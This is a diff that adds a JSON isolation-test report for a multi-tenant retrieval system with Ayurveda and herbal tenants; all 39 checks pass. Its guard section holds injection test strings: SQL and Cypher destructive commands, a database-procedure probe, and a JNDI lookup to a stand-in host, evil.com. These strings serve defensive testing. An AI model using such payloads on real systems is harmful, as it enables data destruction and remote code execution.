@@ -1,0 +1,309 @@
+{
+  "generated_at": "2026-08-15T21:41:42.811273+00:00",
+  "total_checks": 39,
+  "passed": 39,
+  "failed": 0,
+  "verdict": "PASS",
+  "by_path": {
+    "vector": {
+      "passed": 7,
+      "failed": 0
+    },
+    "lexical": {
+      "passed": 7,
+      "failed": 0
+    },
+    "graph": {
+      "passed": 7,
+      "failed": 0
+    },
+    "community": {
+      "passed": 4,
+      "failed": 0
+    },
+    "hybrid": {
+      "passed": 8,
+      "failed": 0
+    },
+    "guard": {
+      "passed": 6,
+      "failed": 0
+    }
+  },
+  "failures": [],
+  "checks": [
+    {
+      "name": "vector:ayurveda_full<-Bacopa monnieri",
+      "path": "vector",
+      "passed": true,
+      "detail": "10 hits from 'ayurveda_full' probing for 'Bacopa monnieri' (owned by 'herbs_docs')",
+      "leaked_terms": []
+    },
+    {
+      "name": "vector:ayurveda_full<-Withania somnifera",
+      "path": "vector",
+      "passed": true,
+      "detail": "10 hits from 'ayurveda_full' probing for 'Withania somnifera' (owned by 'herbs_docs')",
+      "leaked_terms": []
+    },
+    {
+      "name": "vector:ayurveda_full<-Curcumin",
+      "path": "vector",
+      "passed": true,
+      "detail": "10 hits from 'ayurveda_full' probing for 'Curcumin' (owned by 'herbs_docs')",
+      "leaked_terms": []
+    },
+    {
+      "name": "vector:herbs_docs<-Alkaptonuria",
+      "path": "vector",
+      "passed": true,
+      "detail": "6 hits from 'herbs_docs' probing for 'Alkaptonuria' (owned by 'ayurveda_full')",
+      "leaked_terms": []
+    },
+    {
+      "name": "vector:herbs_docs<-Argininosuccinic Aciduri",
+      "path": "vector",
+      "passed": true,
+      "detail": "6 hits from 'herbs_docs' probing for 'Argininosuccinic Aciduria' (owned by 'ayurveda_full')",
+      "leaked_terms": []
+    },
+    {
+      "name": "vector:herbs_docs<-Paschimottanasana",
+      "path": "vector",
+      "passed": true,
+      "detail": "6 hits from 'herbs_docs' probing for 'Paschimottanasana' (owned by 'ayurveda_full')",
+      "leaked_terms": []
+    },
+    {
+      "name": "vector:herbs_docs<-Adrenal Insufficiency",
+      "path": "vector",
+      "passed": true,
+      "detail": "6 hits from 'herbs_docs' probing for 'Adrenal Insufficiency' (owned by 'ayurveda_full')",
+      "leaked_terms": []
+    },
+    {
+      "name": "bm25:ayurveda_full<-Bacopa monnieri",
+      "path": "lexical",
+      "passed": true,
+      "detail": "0 BM25 hits from 'ayurveda_full'",
+      "leaked_terms": []
+    },
+    {
+      "name": "bm25:ayurveda_full<-Withania somnifera",
+      "path": "lexical",
+      "passed": true,
+      "detail": "0 BM25 hits from 'ayurveda_full'",
+      "leaked_terms": []
+    },
+    {
+      "name": "bm25:ayurveda_full<-Curcumin",
+      "path": "lexical",
+      "passed": true,
+      "detail": "0 BM25 hits from 'ayurveda_full'",
+      "leaked_terms": []
+    },
+    {
+      "name": "bm25:herbs_docs<-Alkaptonuria",
+      "path": "lexical",
+      "passed": true,
+      "detail": "0 BM25 hits from 'herbs_docs'",
+      "leaked_terms": []
+    },
+    {
+      "name": "bm25:herbs_docs<-Argininosuccinic Aciduri",
+      "path": "lexical",
+      "passed": true,
+      "detail": "0 BM25 hits from 'herbs_docs'",
+      "leaked_terms": []
+    },
+    {
+      "name": "bm25:herbs_docs<-Paschimottanasana",
+      "path": "lexical",
+      "passed": true,
+      "detail": "0 BM25 hits from 'herbs_docs'",
+      "leaked_terms": []
+    },
+    {
+      "name": "bm25:herbs_docs<-Adrenal Insufficiency",
+      "path": "lexical",
+      "passed": true,
+      "detail": "0 BM25 hits from 'herbs_docs'",
+      "leaked_terms": []
+    },
+    {
+      "name": "graph:ayurveda_full<-Bacopa monnieri",
+      "path": "graph",
+      "passed": true,
+      "detail": "0 entities linked in 'ayurveda_full'",
+      "leaked_terms": []
+    },
+    {
+      "name": "graph:ayurveda_full<-Withania somnifera",
+      "path": "graph",
+      "passed": true,
+      "detail": "0 entities linked in 'ayurveda_full'",
+      "leaked_terms": []
+    },
+    {
+      "name": "graph:ayurveda_full<-Curcumin",
+      "path": "graph",
+      "passed": true,
+      "detail": "0 entities linked in 'ayurveda_full'",
+      "leaked_terms": []
+    },
+    {
+      "name": "graph:herbs_docs<-Alkaptonuria",
+      "path": "graph",
+      "passed": true,
+      "detail": "0 entities linked in 'herbs_docs'",
+      "leaked_terms": []
+    },
+    {
+      "name": "graph:herbs_docs<-Argininosuccinic Aciduri",
+      "path": "graph",
+      "passed": true,
+      "detail": "0 entities linked in 'herbs_docs'",
+      "leaked_terms": []
+    },
+    {
+      "name": "graph:herbs_docs<-Paschimottanasana",
+      "path": "graph",
+      "passed": true,
+      "detail": "0 entities linked in 'herbs_docs'",
+      "leaked_terms": []
+    },
+    {
+      "name": "graph:herbs_docs<-Adrenal Insufficiency",
+      "path": "graph",
+      "passed": true,
+      "detail": "0 entities linked in 'herbs_docs'",
+      "leaked_terms": []
+    },
+    {
+      "name": "community:ayurveda_full<-Bacopa monnieri",
+      "path": "community",
+      "passed": true,
+      "detail": "0 community reports from 'ayurveda_full'",
+      "leaked_terms": []
+    },
+    {
+      "name": "community:ayurveda_full<-Withania somnifera",
+      "path": "community",
+      "passed": true,
+      "detail": "0 community reports from 'ayurveda_full'",
+      "leaked_terms": []
+    },
+    {
+      "name": "community:herbs_docs<-Alkaptonuria",
+      "path": "community",
+      "passed": true,
+      "detail": "2 community reports from 'herbs_docs'",
+      "leaked_terms": []
+    },
+    {
+      "name": "community:herbs_docs<-Argininosuccinic Aci",
+      "path": "community",
+      "passed": true,
+      "detail": "2 community reports from 'herbs_docs'",
+      "leaked_terms": []
+    },
+    {
+      "name": "hybrid:ayurveda_full<-Bacopa monnieri",
+      "path": "hybrid",
+      "passed": true,
+      "detail": "18 passages, 100 nodes from 'ayurveda_full'",
+      "leaked_terms": []
+    },
+    {
+      "name": "hybrid:ayurveda_full<-Withania somnifera",
+      "path": "hybrid",
+      "passed": true,
+      "detail": "18 passages, 100 nodes from 'ayurveda_full'",
+      "leaked_terms": []
+    },
+    {
+      "name": "hybrid:ayurveda_full<-Curcumin",
+      "path": "hybrid",
+      "passed": true,
+      "detail": "18 passages, 100 nodes from 'ayurveda_full'",
+      "leaked_terms": []
+    },
+    {
+      "name": "hybrid:herbs_docs<-Alkaptonuria",
+      "path": "hybrid",
+      "passed": true,
+      "detail": "13 passages, 9 nodes from 'herbs_docs'",
+      "leaked_terms": []
+    },
+    {
+      "name": "hybrid:herbs_docs<-Argininosuccinic Aciduri",
+      "path": "hybrid",
+      "passed": true,
+      "detail": "13 passages, 9 nodes from 'herbs_docs'",
+      "leaked_terms": []
+    },
+    {
+      "name": "hybrid:herbs_docs<-Paschimottanasana",
+      "path": "hybrid",
+      "passed": true,
+      "detail": "13 passages, 9 nodes from 'herbs_docs'",
+      "leaked_terms": []
+    },
+    {
+      "name": "hybrid:herbs_docs<-Adrenal Insufficiency",
+      "path": "hybrid",
+      "passed": true,
+      "detail": "13 passages, 9 nodes from 'herbs_docs'",
+      "leaked_terms": []
+    },
+    {
+      "name": "concurrent_interleaved_isolation",
+      "path": "hybrid",
+      "passed": true,
+      "detail": "48 interleaved cross-tenant requests, 0 leaks, 0 errors",
+      "leaked_terms": []
+    },
+    {
+      "name": "injection:Cough'; DROP DATABASE tenant_ayurv",
+      "path": "guard",
+      "passed": true,
+      "detail": "rejected: Potentially malicious pattern detected in user_query: statem",
+      "leaked_terms": []
+    },
+    {
+      "name": "injection:Cough DETACH DELETE n",
+      "path": "guard",
+      "passed": true,
+      "detail": "rejected: Potentially malicious pattern detected in user_query: destru",
+      "leaked_terms": []
+    },
+    {
+      "name": "injection:Cough UNION ALL MATCH (n) RETURN n",
+      "path": "guard",
+      "passed": true,
+      "detail": "rejected: Potentially malicious pattern detected in user_query: query ",
+      "leaked_terms": []
+    },
+    {
+      "name": "injection:Cough CALL dbms.components()",
+      "path": "guard",
+      "passed": true,
+      "detail": "rejected: Potentially malicious pattern detected in user_query: proced",
+      "leaked_terms": []
+    },
+    {
+      "name": "injection:Cough ${jndi:ldap://evil.com/a}",
+      "path": "guard",
+      "passed": true,
+      "detail": "rejected: Potentially malicious pattern detected in user_query: templa",
+      "leaked_terms": []
+    },
+    {
+      "name": "injection:Cough /* comment */ RETURN 1",
+      "path": "guard",
+      "passed": true,
+      "detail": "rejected: Potentially malicious pattern detected in user_query: block ",
+      "leaked_terms": []
+    }
+  ]
+}
